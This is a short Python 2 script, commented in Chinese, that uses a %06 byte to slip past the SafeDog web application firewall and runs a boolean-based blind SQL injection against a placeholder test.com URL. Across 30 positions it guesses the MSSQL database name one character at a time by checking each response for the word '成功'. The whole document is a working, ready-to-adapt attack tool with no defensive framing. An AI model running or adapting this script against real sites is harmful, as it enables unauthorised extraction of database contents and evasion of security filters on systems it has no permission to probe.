#!/usr/bin/env python
# coding=utf-8
#利用%06绕过安全狗

import sys
import time
import requests

reload(sys)
sys.setdefaultencoding('utf-8')
headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
}

key = ""

for j in range(1,30):
    for i in range (47,123):
        url = "http://test.com/test.php?id=111%27%06and%06ascii(substring(db_name(0),"+str(j)+",1))="+str(i)+"--"
        req = requests.get(url, timeout=10)
        if req.text.find("成功") is not -1:
            key += chr(i)
            print chr(i),
            break
        else:
            pass
        time.sleep(1)

print key